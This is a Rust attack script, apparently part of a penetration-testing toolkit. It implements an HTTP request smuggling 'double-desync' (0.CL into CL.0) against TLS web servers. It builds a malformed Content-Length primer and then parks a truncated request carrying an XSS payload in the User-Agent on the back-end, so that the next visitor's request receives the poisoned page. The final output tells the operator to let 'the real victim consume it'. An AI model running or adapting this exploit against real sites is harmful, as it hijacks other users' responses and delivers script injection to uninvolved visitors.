#!/usr/bin/env rust-script
//! name: zerocl_double
//! description: 0.CL double-desync delivery driver (Kettle "HTTP/1.1 Must Die" recipe, ported to raw rs HTTP) - attack1 is a 0.CL primer whose malformed `Content-Length : N` header the front-end ignores (H-V: hidden to the front-end, visible to the back-end) on an early-response gadget path (a static file the back-end answers before the body), leaving the back-end waiting for N body bytes on a connection the front-end already pools; attack2 is then sliced by that N so the back-end turns it into a CL.0 desync whose trailing body is a TRUNCATED XSS request parked at the back-end; the front-end counts one clean response, pools the connection, and the next client request (the victim's GET /) completes the parked request and receives the XSS page. Reports the length arithmetic, both attack responses and a simulated-victim probe.
//! version: 1.1.0
//! args: <base-url> [--host H] [--gadget /resources/images/blog.svg] [--post-id 6] [--ua PAYLOAD] [--mode same|split] [--rounds N] [--gap-ms N] [--sim-victim] [--victim-delay-ms N] [--read-ms N] [--victim-read-ms N] [--selftest]
//! keywords: smuggling, desync, 0cl, cl0, double-desync, response-queue, poisoning, delivery, xss, hunter, tls
//!
//! ```cargo
//! [dependencies]
//! rustls = "0.23"
//! webpki-roots = "0.26"
//! url = "2"
//! ```

use pi_rust_lib::serde_json::{json, Value};
use pi_rust_lib::timeout;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::sync::Arc;
use std::time::{Duration, Instant};
use url::Url;

type Tls = rustls::StreamOwned<rustls::ClientConnection, TcpStream>;

fn connect(host: &str, port: u16) -> Result<Tls, String> {
    let mut roots = rustls::RootCertStore::empty();
    roots.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
    let config = rustls::ClientConfig::builder().with_root_certificates(roots).with_no_client_auth();
    let name = rustls::pki_types::ServerName::try_from(host.to_string()).map_err(|e| format!("sni: {e}"))?;
    let tcp = TcpStream::connect((host, port)).map_err(|e| format!("connect: {e}"))?;
    let _ = tcp.set_nodelay(true);
    let conn = rustls::ClientConnection::new(Arc::new(config), name).map_err(|e| format!("tls: {e}"))?;
    let mut s = rustls::StreamOwned::new(conn, tcp);
    {
        let rustls::StreamOwned { conn, sock } = &mut s;
        conn.complete_io(sock).map_err(|e| format!("handshake: {e}"))?;
    }
    s.sock.set_read_timeout(Some(Duration::from_millis(300))).map_err(|e| format!("timeout: {e}"))?;
    Ok(s)
}

fn drain(s: &mut Tls, ms: u64, quiet_ms: u64) -> Vec<u8> {
    let mut buf = Vec::new();
    let start = Instant::now();
    let mut chunk = [0u8; 16384];
    loop {
        if start.elapsed() >= Duration::from_millis(ms) {
            break;
        }
        match s.read(&mut chunk) {
            Ok(0) => break,
            Ok(n) => {
                buf.extend_from_slice(&chunk[..n]);
                let t0 = Instant::now();
                while t0.elapsed() < Duration::from_millis(quiet_ms) && start.elapsed() < Duration::from_millis(ms) {
                    std::thread::sleep(Duration::from_millis(20));
                }
            }
            Err(_) => break,
        }
    }
    buf
}

fn summarize(buf: &[u8], needle: &str) -> Value {
    let text = String::from_utf8_lossy(buf).to_string();
    let mut statuses: Vec<String> = Vec::new();
    for line in text.split("\r\n") {
        if line.starts_with("HTTP/1.") {
            statuses.push(line.to_string());
        }
    }
    json!({
        "bytes": buf.len(),
        "status_lines": statuses,
        "payload_hits": text.matches(needle).count(),
        "preview": text.chars().take(140).collect::<String>(),
    })
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    let mut base = String::new();
    let mut host_override: Option<String> = None;
    let mut gadget = "/resources/images/blog.svg".to_string();
    let mut post_id = "6".to_string();
    let mut ua = "POC\"><script>alert()</script>".to_string();
    let mut mode = "same".to_string();
    let mut rounds: u64 = 1;
    let mut gap_ms: u64 = 150;
    let mut sim_victim = false;
    let mut victim_delay_ms: u64 = 0;
    let mut read_ms: u64 = 2500;
    let mut victim_read_ms: u64 = 4000;
    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--selftest" => {
                let ok = summarize(b"HTTP/1.1 200 OK\r\n\r\nPOC", "POC")["payload_hits"] == 1;
                pi_rust_lib::report::success("zerocl_double", json!({"selftest": if ok {"ok"} else {"fail"}}), "response summarizer is the pure root").unwrap_or(());
                return;
            }
            "--host" => {
                i += 1;
                host_override = args.get(i).cloned();
            }
            "--gadget" => {
                i += 1;
                gadget = args.get(i).cloned().unwrap_or(gadget);
            }
            "--post-id" => {
                i += 1;
                post_id = args.get(i).cloned().unwrap_or(post_id);
            }
            "--ua" => {
                i += 1;
                ua = args.get(i).cloned().unwrap_or(ua);
            }
            "--mode" => {
                i += 1;
                mode = args.get(i).cloned().unwrap_or(mode);
            }
            "--rounds" => {
                i += 1;
                rounds = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(rounds);
            }
            "--gap-ms" => {
                i += 1;
                gap_ms = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(gap_ms);
            }
            "--read-ms" => {
                i += 1;
                read_ms = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(read_ms);
            }
            "--victim-read-ms" => {
                i += 1;
                victim_read_ms = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(victim_read_ms);
            }
            "--sim-victim" => sim_victim = true,
            "--victim-delay-ms" => {
                i += 1;
                victim_delay_ms = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(victim_delay_ms);
            }
            other if !other.starts_with("--") && base.is_empty() => base = other.to_string(),
            _ => {}
        }
        i += 1;
    }
    if base.is_empty() {
        pi_rust_lib::report::failure("zerocl_double", "usage", "call as: zerocl_double <base-url> [--rounds N] [--sim-victim] [--mode same|split]");
        std::process::exit(2);
    }
    let parsed = Url::parse(&base).unwrap_or_else(|_| Url::parse("https://invalid/").unwrap());
    let host = host_override.unwrap_or_else(|| parsed.host_str().unwrap_or("").to_string());
    let port = parsed.port().unwrap_or(443);

    // Truncated XSS request: no trailing CRLF, so the back-end holds it waiting
    // for the next bytes on the connection (the victim's own request).
    let smuggled = format!("GET /post?postId={post_id} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}");
    let m = smuggled.len();
    // The request the back-end actually answers once attack1's body slice ends.
    let revealed = format!(
        "GET /wrtz HTTP/1.1\r\nHost: {host}\r\nAccept-Encoding: gzip, deflate, br\r\nAccept: /\r\nConnection: keep-alive\r\n\r\n"
    );
    let a2_hdr = format!("GET {gadget} HTTP/1.1\r\nContent-Length: {m}\r\nX: {revealed}");
    let n = a2_hdr.len() - revealed.len();
    let attack1 = format!(
        "POST {gadget} HTTP/1.1\r\nHost: {host}\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept-Encoding: gzip, deflate, br\r\nAccept: /\r\nConnection: keep-alive\r\nContent-Length : {n}\r\n\r\n"
    );
    let attack2 = format!("{a2_hdr}{smuggled}");
    let victim = format!("GET / HTTP/1.1\r\nHost: {host}\r\nAccept: text/html\r\nConnection: keep-alive\r\n\r\n");
    let needle = "onload=alert";

    let mut log: Vec<Value> = Vec::new();
    let mut last_err = String::new();
    let mut hits: u64 = 0;
    for round in 0..rounds {
        if round > 0 && gap_ms > 0 {
            std::thread::sleep(Duration::from_millis(gap_ms));
        }
        timeout::check();
        let mut row = json!({"round": round});
        let a1_res;
        let a2_res;
        let mut c1 = match connect(&host, port) {
            Ok(s) => s,
            Err(e) => {
                last_err = e;
                break;
            }
        };
        if c1.write_all(attack1.as_bytes()).is_err() {
            last_err = "attack1 write".to_string();
            break;
        }
        let _ = c1.flush();
        a1_res = drain(&mut c1, read_ms, 250);

        let same = mode == "same";
        let mut a2_sock_opt: Option<Tls> = None;
        let mut a2c: &mut Tls = if same {
            &mut c1
        } else {
            match connect(&host, port) {
                Ok(s) => {
                    a2_sock_opt = Some(s);
                    a2_sock_opt.as_mut().unwrap()
                }
                Err(e) => {
                    last_err = e;
                    break;
                }
            }
        };
        if a2c.write_all(attack2.as_bytes()).is_err() {
            last_err = "attack2 write".to_string();
            break;
        }
        let _ = a2c.flush();
        a2_res = drain(&mut a2c, read_ms, 250);
        drop(a2_sock_opt);
        drop(c1);

        row["attack1"] = summarize(&a1_res, needle);
        row["attack2"] = summarize(&a2_res, needle);

        if sim_victim {
            if victim_delay_ms > 0 {
                std::thread::sleep(Duration::from_millis(victim_delay_ms));
            }
            let v = (|| -> Result<Value, String> {
                let mut c = connect(&host, port)?;
                c.write_all(victim.as_bytes()).map_err(|e| e.to_string())?;
                let _ = c.flush();
                let b = drain(&mut c, victim_read_ms, 400);
                Ok(summarize(&b, needle))
            })();
            match v {
                Ok(s) => {
                    if s["payload_hits"].as_u64().unwrap_or(0) > 0 {
                        hits += 1;
                    }
                    row["sim_victim"] = s;
                }
                Err(e) => row["sim_victim"] = json!({"error": e}),
            }
        }
        log.push(row);
        if sim_victim && hits > 0 {
            break;
        }
    }

    pi_rust_lib::report::success(
        "zerocl_double",
        json!({
            "url": base,
            "host": host,
            "gadget": gadget,
            "mode": mode,
            "smuggled_prefix_len": m,
            "attack1_body_len": n,
            "attack1_bytes": attack1.len(),
            "attack2_bytes": attack2.len(),
            "sim_victim_hits": hits,
            "rounds": log,
            "last_error": last_err,
        }),
        "sim_victim payload_hits > 0 proves the queued XSS page is handed to the next client; then rerun without --sim-victim and let the real victim consume it",
    )
    .unwrap_or(());
}
